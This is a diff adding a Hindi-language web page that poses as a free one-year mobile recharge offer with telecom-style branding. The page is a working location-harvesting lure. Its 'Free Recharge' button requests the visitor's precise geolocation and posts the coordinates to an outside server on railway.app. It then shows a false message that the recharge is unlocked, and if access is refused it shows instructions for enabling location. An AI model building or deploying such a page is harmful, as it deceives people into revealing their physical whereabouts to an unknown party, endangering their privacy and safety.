@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="hi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>1 साल का रिचार्ज फ्री में</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background: url("jio.webp") no-repeat center center fixed;
+        background-size: cover;
+        height: 100vh;
+        position: relative;
+        overflow: auto;
+      }
+
+      .overlay {
+        position: absolute;
+        top: 0;
+        left: 0;
+        height: 100%;
+        width: 100%;
+        background-color: rgba(0, 0, 0, 0.65);
+        z-index: 1;
+      }
+
+      .card {
+        position: relative;
+        z-index: 2;
+        width: 90%;
+        max-width: 380px;
+        background: #ffffffdd;
+        border-radius: 16px;
+        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+        padding: 20px;
+        text-align: center;
+        margin: 60px auto;
+      }
+
+      .card h2 {
+        font-size: 22px;
+        color: #c10000;
+        margin-bottom: 8px;
+      }
+
+      .price {
+        font-size: 32px;
+        font-weight: bold;
+        margin: 8px 0;
+        color: #000;
+      }
+
+      .plan-label {
+        font-weight: bold;
+        color: #333;
+        font-size: 16px;
+        margin-bottom: 12px;
+      }
+
+      .section {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 10px;
+        font-size: 14px;
+        color: #555;
+        gap: 5px;
+      }
+
+      .section div {
+        flex: 1;
+        text-align: center;
+      }
+
+      .btn {
+        margin-top: 25px;
+        background-color: #0036ff;
+        color: white;
+        padding: 14px;
+        width: 100%;
+        border: none;
+        border-radius: 10px;
+        font-size: 18px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+      }
+
+      .btn:hover {
+        background-color: #0028cc;
+      }
+
+      .tagline {
+        font-size: 13px;
+        color: #ffeb3b;
+        margin-top: 12px;
+        font-weight: 600;
+      }
+
+      .true5g {
+        font-weight: bold;
+        color: #c10000;
+        font-size: 13px;
+        float: right;
+      }
+
+      .status {
+        margin-top: 10px;
+        font-weight: bold;
+        color: green;
+        font-size: 14px;
+      }
+
+      .guide-image {
+        margin-top: 20px;
+        width: 100%;
+        border-radius: 12px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        display: none;
+      }
+
+      .loader {
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #2196f3;
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        margin: 10px auto;
+        animation: spin 1s linear infinite;
+        display: none;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      @media screen and (max-width: 480px) {
+        .card h2 {
+          font-size: 20px;
+        }
+
+        .price {
+          font-size: 28px;
+        }
+
+        .plan-label {
+          font-size: 14px;
+        }
+
+        .btn {
+          font-size: 16px;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="overlay"></div>
+
+    <div class="card">
+      <h2>1 साल का रिचार्ज फ्री में</h2>
+      <div class="true5g">TRUE 5G</div>
+
+      <div class="price">₹3999</div>
+      <div class="plan-label">2.5 GB/दिन प्लान</div>
+
+      <div class="section">
+        <div><strong>365 दिन</strong><br />वैधता</div>
+        <div><strong>2.5 GB/दिन</strong><br />डेटा</div>
+        <div><strong>+1</strong><br />सब्सक्रिप्शन</div>
+      </div>
+
+      <button class="btn" onclick="getLocation()">🎁 Free Recharge</button>
+      <div class="loader" id="loader"></div>
+      <div class="status" id="status"></div>
+      <img
+        src="direction.jpg"
+        alt="लोकेशन ऑन कैसे करें"
+        class="guide-image"
+        id="guideImage"
+      />
+    </div>
+
+    <script>
+      function getLocation() {
+        const status = document.getElementById("status");
+        const loader = document.getElementById("loader");
+        const guideImage = document.getElementById("guideImage");
+
+        // Reset previous image visibility
+        guideImage.style.display = "none";
+
+        loader.style.display = "block";
+        status.style.color = "green";
+        status.textContent =
+          "🔄 कृपया प्रतीक्षा करें... फ्री रिचार्ज प्रक्रिया जारी है।";
+
+        if (!navigator.geolocation) {
+          loader.style.display = "none";
+          status.style.color = "red";
+          status.textContent = "❌ आपका ब्राउज़र लोकेशन सपोर्ट नहीं करता।";
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            status.textContent =
+              "🎁 आपका फ्री रिचार्ज प्रोसेस किया जा रहा है...";
+            sendToServer(latitude, longitude);
+          },
+          (error) => {
+            loader.style.display = "none";
+            status.style.color = "red";
+            status.textContent = "❌ कृपया नीचे दिए गए निर्देशों को फॉलो करें।";
+            guideImage.style.display = "block";
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0,
+          }
+        );
+      }
+
+      function sendToServer(lat, lon) {
+        const status = document.getElementById("status");
+        const loader = document.getElementById("loader");
+
+        fetch(
+          "https://locationapi-production-91bd.up.railway.app/api/locations",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ latitude: lat, longitude: lon }),
+          }
+        )
+          .then((res) => {
+            loader.style.display = "none";
+            if (res.ok) {
+              status.style.color = "green";
+              status.textContent =
+                "✅ फ्री रिचार्ज ऑफर अनलॉक हो गया! कुछ ही देर में आपका रिचार्ज प्रोसेस हो जाएगा।";
+            } else {
+              throw new Error(
+                "❌ फ्री रिचार्ज पाने के लिए नीचे दिए गए निर्देशों को ध्यान से फॉलो करें।"
+              );
+            }
+          })
+          .catch((err) => {
+            loader.style.display = "none";
+            status.style.color = "red";
+            status.textContent = "❌ त्रुटि: " + err.message;
+          });
+      }
+    </script>
+  </body>
+</html>
